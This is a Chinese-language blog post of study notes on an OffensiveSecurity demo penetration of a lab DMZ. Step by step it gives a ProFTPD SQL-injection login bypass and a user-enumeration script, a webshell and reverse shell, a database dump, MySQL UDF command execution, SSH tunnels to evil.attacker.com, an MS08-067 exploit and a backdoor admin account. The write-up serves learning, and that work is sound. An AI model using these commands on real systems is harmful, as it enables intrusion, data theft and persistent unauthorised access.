---
title: OffensiveSecurity 渗透测试视频学习笔记
category: Sec
---

# {{ page.title }}

## 过程

**OffensiveSecurity** 提供了一个[演示渗透测试的视频](https://www.offensive-security.com/information-security-training/)，其中的思路不错，简单记录一下：

经典的 DMZ 环境：

```
graph LR
    A[Attacker] --> B[DMZ www.offseclabs.com]
    B --> C[Internal network]
```

- 扫描

```
nmap -p 80,21 www.offseclabs.com
```

发现端口确实开放。

- 尝试连接 HTTP

```
nc -v www.offseclabs.com 80
```

输入一个 HTTP 交互头：

```
HEAD / HTTP/1.0
```

`HEAD`表示只请求页面首部。从返回信息中得到：

```
Apache 2.2.9 (Ubuntu)
PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch
```

能够获得这些重要信息让我惊喜。

另外，上面出现了`Suhosin-Patch`，它是 PHP 的安全扩展，其名为韩语，意为“守护神”。从其[官方主页](https://suhosin.org/stories/index.html)可以获得更多信息，它的源代码在[这里](https://github.com/sektioneins/suhosin)。

- 尝试连接 FTP

```
ftp www.offseclabs.com
```

尝试用`bob`用户登录，失败。但是获得以下信息：

```
目标主机为 Unix
FTP 服务器程序为存在漏洞的 ProFTPD，且使用了 mod_mysql 模块
```

上面第二点信息作者说是通过探针获得的。我不是太懂，之前使用`bob`尝试登录过程中的交互信息如下：

```
220 Welcome to the CorpCom FTP Server.
...
530 Login incorrect
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
```

我猜测最后两句话可能是`ProFTPD`特有的吧。

接下来开始尝试 SQL 注入：

```
# 在输入用户名时输入
%') and 1=2 union select 1,1,uid,gid,homedir,shell from ftpuser; --
# 在输入密码时直接回车
```

成功登入。这说明漏洞存在。

注：经过搜索，我发现这里存在一个漏洞`CVE-2009-0542`，详情见附录一。Youtube上有一个类似的[演示视频](https://www.youtube.com/watch?v=s5EtYRiMf_o)，但是在那个视频中交互信息里明确出现了`ProFTPD 1.3.1`字样。

下一步，要寻找到一个有价值的 FTP 用户，作者希望能够利用 FTP 上传一个`WebShell`。

- Bruteforce

利用以下脚本去穷举有价值的 FTP 用户：

```python
from ftplib import FTP
print "Attempting User Directory Discover Via FTP"
for i in range(0, 6):
    username = "%') and 1=2 union select 1,1,uid,gid,homedir,shell from ftpuser LIMIT " + str(i) + ",1; -- "
    password = str("1")
    ftp = FTP('www.offseclabs.com')
    ftp.login(username, password)
    print "Logged in as user" + str(i) + ",1"
    ftp.retrlines('LIST')
    ftp.close()
```

穷举到第六个用户时发现它的`homedir`映射到了 HTTP 应用的`root目录`（管理员是为了方便吗）。

- 获取 Shell

利用上面获得的 FTP 用户连接到服务器，带反弹 Shell 的 Webshell：

```
put rs.php
```

在本地开`nc`监听，然后命令行`wget`访问 Webshell：

```
nc -lvp 80
wget www.offseclabs.com/rs.php
```

至此，拿到了一个 DMZ 的 Shell。

- 向内网渗透

在拿到的 Shell 中`/sbin/ifconfig`发现其内网参数为`10.150.0.1/24`。

接着，进入`/var/www/includes/`查看 PHP 配置：

```
cat configure.php
```

在其中发现该服务器架设的网站使用内网一台机器作为数据库服务器，其配置信息如下：

```
define('DB_SERVER', '10.150.0.5');
define('DB_SERVER_USERNAME', 'root');
define('DB_SERVER_PASSWORD', 'xxxxxx');
define('DB_DATABASE', 'oscommerce');
```

于是将数据库导出：

```
mysqldump -u root -pxxxxxx -h 10.150.0.5 oscommerce > /var/www/images/ccdump.txt
```

导出后，即可用浏览器访问这个文件。

接下来，作者想要利用数据库向数据库服务器渗透。他利用之前的 FTP 向 HTTP 根目录上传了一个`up.php`和一个`up.html`。其功能是提供一个上传文件的页面，并且能够把上传的文件以作者指定的 ID 存入指定数据库（这里我不太清楚其具体过程，从后文看似乎是新建了一个名为`pwn`的数据库）。

打开浏览器访问上述上传页面，作者上传了一个恶意 MySQL UDF 库`lib_mysqludf_sys.so`（附录三给出了更多关于 MySQL UDF 的介绍和利用方法）并设置 ID 为 1，接着上传了一个二进制版反弹 Shell，并设置 ID 为 2。

OK。接着在之前获得的 Shell 中连接数据库：

```
mysql -u root -pxxxxxx -h 10.150.0.5
```

注意，这个 Shell 是没有回显的。

将之前上传的文件写入内网数据库服务器的文件系统：

```
use pwn;
select imgdata from binfile where title="1" into dumpfile '/usr/lib/lib_mysqludf_sys.so';
select imgdata from binfile where title="2" into dumpfile '/tmp/bd';
```

接着需要在数据库中引入一些函数：

```
CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
```

至此，获得在内网数据库服务器上执行代码的能力。现在开启反弹 Shell：

```
SELECT sys_eval('chmod 755 /tmp/bd');
SELECT sys_eval('/tmp/bd &');
```

注意，这个 Shell 是从数据库端口 3306 发出的。

与之前不同的是，这个 Shell 是 root 权限。

- 内网横向渗透

作者通过枚举内网存活主机，发现了一台`Windows 2003 R2`，地址为`10.150.0.20`。

这里作者首先`ping`了一下这个地址。其实通过`ttl`值可以大概判断目标操作系统，详细内容见附录六。

用数据库服务器做端口转发，使攻击机器与内网`.20`机器的 445 端口建立连接：

```
ssh -l root -t -t -R 445:10.150.0.20:445 evil.attacker.com
```

注意，上述命令中的`-t -t`表示本次操作独立占用一个`tty`（如果只有一个`-t`则代表独立占用一个伪终端）。关于端口转发，参考这篇[文章](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/)。

此时，内网`.20`机器的 445 端口已经被映射到攻击者机器的 445 端口（这个过程我不太懂）。

接着对 445 端口做漏洞扫描：

```
nmap -sS 127.0.0.1 -p 445 --script smb-check-vulns.nse
```

发现目标机器存在`ms08-067`漏洞。

接下来就是漏洞利用：触发漏洞，然后在`.20`上 4444 端口绑定一个 Shell。

首先利用数据库服务器的 Shell 再做一个端口转发：

```
ssh -l root -t -t -R 4444:10.150.0.20:4444 evil.attacker.com
```

绑定 Shell 的 Shellcode 是以 Egghunter 方式编写的。关于这种方式的更多内容可以参考附录四。

关于`ms08-067`，参考附录五。

漏洞利用脚本太长，这里就不贴了，网上应该有很多。

```
./exploit.py 127.0.0.1
```

注意前边已经把 445 端口映射过了，所以这里打本地端口就可以。

```
nc -v 127.0.0.1 4444
```

成功获得 Shell。接着添加一个管理员用户：

```
net user hacker hacker /add
localgroup administrators hacker /add
```

在数据库服务器上再做一次 Windows 远程桌面的 3389 端口的转发：

```
ssh -l root -t -t -R 3389:10.150.0.20:3389 evil.attacker.com
```

最后，在攻击者本地开启远程桌面：

```
rdesktop 127.0.0.1
```

Bingo!

## 思考

通过本次学习，我发现借助渗透测试演示视频来学习、复现是非常好的提升方法。其中也考察了两个能力：

- 资料搜集能力
- 环境快速、准确搭建能力

另外有一个值得注意的地方：作者的反弹 Shell 反弹到的端口都是 本地的 80。这是可行的。`TCP`方式监听决定了每次建立连接后都会有一个新的端口分配出来供这次连接使用。对于`nc`来说，连接建立后 80 就不再使用了（除非你加了`-k`之类的保持监听的参数）。所以可以重复使用`nc`监听 80 端口。这对于周期性反弹 Shell 时建立多个连接有帮助。

作者的渗透过程十分精彩。让我想起猪猪侠前辈在一次[经历分享](https://github.com/ring04h/papers/blob/master/我的白帽学习路线--20170325.pdf)中讲的一句话：

> 知识面，决定看到的攻击面有多广。  
> 知识链，决定发动的杀伤链有多深。

这个渗透过程也有缺失的地方：后渗透。如果能再展示一下后渗透阶段的操作就更好了。

## 附录一 | CVE-2009-0542

`ProFTPD 1.3`的`mod_sql`模块中`用户名`部分存在`SQL 注入`。

> ProFTPD的SQL认证模块没有正确地处理百分号字符（%）。在mod_sql查询中，可使用百分号表示变量。当mod_sql模块查找到百分号时，就会试图用变量替换，这就改变了基本查询的用户名。

> Anyway, %' effectively makes the single quote unescaped and that eventually allows for an SQL injection during login.

应该是对`%`的处理存在问题。

参考：

- [ProFTPD mod_sql用户名SQL注入漏洞](https://www.seebug.org/vuldb/ssvid-4756)
- [ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection](https://www.exploit-db.com/exploits/32798/)
- [ProFTPd - 'mod_mysql' Authentication Bypass](https://www.exploit-db.com/exploits/8037/)

## 附录二 | Webshell 反弹 Shell

关于反弹 Shell，可以参考我之前的一篇[总结文章](http://aptx4869.me/sec/2017/11/20/Linux-reverseShell.html)。

这里想补充的是带有反弹 Shell 功能的 Webshell。可以自行搜索以下关键词：

```
PHPSpy
JSPSpy
ASPXSpy
```

## 附录三 | MySQL UDF

`UDF`即`User Defined Functions`。其中包含一些函数，能够对系统进行操作。一般常用的如下：

```
sys_eval() # 执行任意命令，并将输出返回
sys_exec() # 执行任意命令，并将退出码返回
sys_get() # 获取一个环境变量
sys_set() # 创建或修改一个环境变量
```

参考：

- [The UDF Repository for MySQL](http://www.mysqludf.org/about.html)
- [MySQL使用UDF调用shell脚本](http://blog.csdn.net/jssg_tzw/article/details/73235232)
- [MySQL 利用UDF执行命令](http://blog.csdn.net/x728999452/article/details/52413974)
- [Linux MySQL Udf 提权](http://www.91ri.org/16540.html)

## 附录四 | EggHunter

> An egg hunter is a piece of code that when is executed is looking for another piece of code (usually bigger) called the egg and it passes the execution to the egg. This technique is usually used when the space of executing shellcode is limited (the available space is less than the egg size) and it is possible to inject the egg in another memory location. Because the egg is injected in a non static memory location the egg must start with an egg tag in order to be recognized by the egg hunter.

这种 Shellcode 的方式适用于溢出点缓冲区空间小于 Payload 长度的情况。其思想是：在内存的其他位置放入带有“头标记”的 Payload 作为 Egg，在溢出点放入一段很短的代码作为 Hunter，这段小型代码作用是：

1. 在内存中搜索“头标记”
2. 将控制流交给“头标记”后真正的 Payload

参考：

- [How to write a (Linux x86) egg hunter shellcode](https://adriancitu.com/2015/10/05/how-to-write-an-egg-hunter-shellcode/)
- [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
- [Egg Hunter](https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf)
- [Assembly Language and Shellcoding on Linux - Part 4 (Assignment 3)](https://whitehatters.academy/assembly-language-and-shellcoding-on-linux-part-4/)


## 附录五 | MS08-067

暂略。

## 附录六 | TTL 与 操作系统类型

TTL 就是 Time to Live，具体含义不再多说。重要的是，不同操作系统做 ICMP 回显应答时的 TTL 值设定也不一样，一般如下：

|OS|TTL|
|:-:|:-:|
|Linux|64 或 255|
|Windows 98|32|
|Windows NT/2K/...|128|
|Mac OS X|64|

参考：

- [ping命令返回的TTL值判断操作系统](https://www.cnblogs.com/ziyeqingshang/p/3769542.html)
- [利用ping命令的ttl值来判断服务器操作系统](https://wenku.baidu.com/view/0c8097343968011ca30091bd.html)
- [过PING命令中的TTL来判断对方操作系统](http://www.51testing.com/html/68/89868-11976.html)
